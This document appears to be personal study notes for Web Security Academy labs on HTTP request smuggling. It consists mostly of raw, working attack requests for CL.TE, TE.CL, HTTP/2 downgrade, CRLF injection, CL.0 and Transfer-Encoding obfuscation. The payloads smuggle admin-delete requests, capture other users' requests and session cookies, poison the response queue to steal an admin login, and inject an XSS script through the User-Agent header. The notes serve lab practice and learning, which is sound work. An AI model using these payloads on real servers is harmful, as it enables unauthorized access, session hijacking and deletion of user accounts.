Tests CL.TE
```
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X

------------------

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

x=

------------------ (leaked header in search result using huge length)
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
------------------(trick victim to post comment)

Content-Length: 274
Transfer-encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 922
Cookie: session=4WlY1Dmu18NrQ3op5uCyFSOvhs1abfKX

csrf=1vraLv6LFICh6vv65uO8YmdU6zimCfSO&postId=1&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=VIC

------------------(xss)
Transfer-Encoding: chunked

0

GET /post?postId=2 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

------------------

```

Tests TE.CL
```
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0(\r\n\r\n)
------------------

Content-length: 4
Transfer-Encoding: chunked

84
POST /admin/delete HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

username=carlos
0(\r\n\r\n)
------------------


```

H2.TE (from http2 to http 1.1)
```
POST / HTTP/2
Host: 0a01008f0443790380e126dd00ad0050.web-security-academy.net
...
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X

------------------(steal session)
(send a couple times till you get a redirect with administrator login, a trick is to send it to intruder each 10 seconds)
POST / HTTP/2
Host: 0a2400b103b2814a805b62010085009f.web-security-academy.net
Transfer-Encoding: chunked

0

GET /asd HTTP/1.1
Host: 0a2400b103b2814a805b62010085009f.web-security-academy.net
(\r\n\r\n)

------------------(CRLF injection)
Add a new header in the inspector with value bar (shift+enter) **Name**
`foo`
**Value**
`bar\r\n Transfer-Encoding: chunked`

Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a12003e0324d3d08115ac1a00a5001d.web-security-academy.net
Cookie: session=LnqD80cuKEGiqyPBvz95w9eS3RapFJrP
Content-Length: 810

search=x
------------------(CRLF request splitting)
add a new header with the inspector foo:
bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: 0a1800e704914121837178e2006900c2.web-security-academy.net\r\n
Cookie: session=SvlgmHX4gv3pEkMprFcz1XmYYBNppKbO
(make sure cookie is the same, response que to steal admin cookie)


```


CL.0
```
2 GET Requests
Change the first one to a post
Both to http/1.1
fist one with connection: keep-alive
first one finishing with

GET /404 HTTP/1.1
Foo: x

if 404 vulnerable when sent both in a group as single connection

Use static files such as images to cause a desync(first tab response contains the resources, second the admin or 404):

POST /resources/images/blog.svg HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net C
ookie: session=YOUR-SESSION-COOKIE 
Connection: keep-alive 
Content-Length: CORRECT 

GET /admin/delete?username=carlos HTTP/1.1 
Foo: x
```
![[Pasted image 20240315003343.png]]

Transfer-Encoding ofuscation
```
POST / HTTP/1.1
Content-length: 4 (do not update automatically in repeater)
Transfer-Encoding: chunked 
Transfer-encoding: cow 

5c 
GPOST / HTTP/1.1 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 15 

x=1 
0


```

----- lab stuff -----
##### CL.TE vulnerabilities
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

 Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store. 
```
POST / HTTP/1.1
Host: 0aa0009704d2249abe839144007700f2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```



----- lab stuf ------
##### TE.CL vulnerabilities
First need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

You need to include the trailing sequence ```\r\n\r\n``` following the final 0. 
```
POST / HTTP/1.1
Host: 0a8a002104f7b5c082ffec0300a400f9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```
5e because its the lenght of 
```
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```

##### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
```
POST / HTTP/1.1
Host: 0ad0009f04e3c16880e3537100ed00ca.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

x=
```


##### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
```
POST / HTTP/1.1
Host: 0a9b001f03f263298521097300ec0098.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

84
POST /admin/delete HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

username=carlos
0


```


##### Exploiting HTTP request smuggling to reveal front-end request rewriting
Protection with a header of IP matching 127.0.0.1
Notice how the following request shows search results for the test parameter
```
POST / HTTP/1.1
Host: 0acb003b035f179f8162dec100ee0067.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```
![[Pasted image 20240105114405.png]]

Delete user adding the header
```
POST / HTTP/1.1
Host: 0acb003b035f179f8162dec100ee0067.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 167
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-KdXvJe-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

x=1
```


##### Exploiting HTTP request smuggling to capture other users' requests
If you encounter a timeout, this may indicate that the number of bytes you're trying to capture is greater than the total number of bytes in the subsequent request. Try reducing the `Content-Length` specified in the smuggled request prefix.
```
POST / HTTP/1.1

Host: 0ae9000503e7980b806e71de00eb0092.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-Length: 275

Transfer-Encoding: chunked



0



POST /post/comment HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 922

Cookie: session=iVS3wY3HIEnn7NPZ3NnpwWKYwZnXF3rY



csrf=zzNUDHPLyUsBKY9KV2eApAvys4Tvth4N&postId=1&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

##### h2-cl abusing redirection smuggling
```
POST / HTTP/2
Host: 0ada000a04db9eee81a7845e00980012.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0aa800a704359e65811883a10167006c.exploit-server.net
Content-Length: 5


x=1
```

##### Response que
Send the request to poison the response queue. You will receive the 404 response to your own request.

Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie. 
```
POST /x HTTP/2
Host: 0a9b005703235c58801817f100200097.web-security-academy.net
Content-Type: application/x-www-from-urlencoded
Transfer-Encoding: chunked
Content-Length: 166


0

GET /admin/delete?username=carlos HTTP/1.1
Host: 0a9b005703235c58801817f100200097.web-security-academy.net
Cookie: session=gs6GC6omabONKuqpbo3D4fQgIH5orkZA

```

##### smuggling XSS
```
POST / HTTP/1.1
Host: 0a5100ce032a50ea80977b11007300c3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=2 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5


x=1
```

##### HTTP/2 request smuggling via CRLF injection
Add a new header in the inspector with value bar (shift+enter) Transfer-Encoding: chunked
```
0

POST / HTTP/1.1
Host: 0a12003e0324d3d08115ac1a00a5001d.web-security-academy.net
Cookie: session=LnqD80cuKEGiqyPBvz95w9eS3RapFJrP
Content-Length: 810

search=x
```
![[Pasted image 20240108132039.png]]


##### HTTP/2 request splitting via CRLF injection
```
Using the Inspector, append an arbitrary header to the end of the request. In the header value, inject `\r\n` sequences to split the request so that you're smuggling another request to a non-existent endpoint as follows:

**Name**

`foo`

**Value**
bar\r\n \r\n GET /x HTTP/1.1\r\n Host: YOUR-LAB-ID.web-security-academy.net
```
GET /admin HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Cookie: session=STOLEN-SESSION-COOKIE


##### CL.0 request smuggling
Test endpoints vulnerable to ignore Content-Length
Add two requests to a group and send in sequence both
Change the `Connection` header of the first request to `keep-alive`
If vulnerable, recieve a 404
```
POST /resources/images/blog.svg HTTP/2
Host: 0aec0010048b77f1847ba91b00f000ef.web-security-academy.net
Cookie: session=3JAVWbW7FjDvOWKLu9ihCc7HFHJ6Pd69
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

GET /404040404 HTTP/1.1
Foo: x
```
Delete user
```
Test endpoints vulnerable to ignore Content-Length
POST /resources/images/blog.svg HTTP/2
Host: 0aec0010048b77f1847ba91b00f000ef.web-security-academy.net
Cookie: session=3JAVWbW7FjDvOWKLu9ihCc7HFHJ6Pd69
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

##### ofuscate TE
```
POST / HTTP/1.1
Host: 0a2e006c03d3946d9d2c562800230015.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

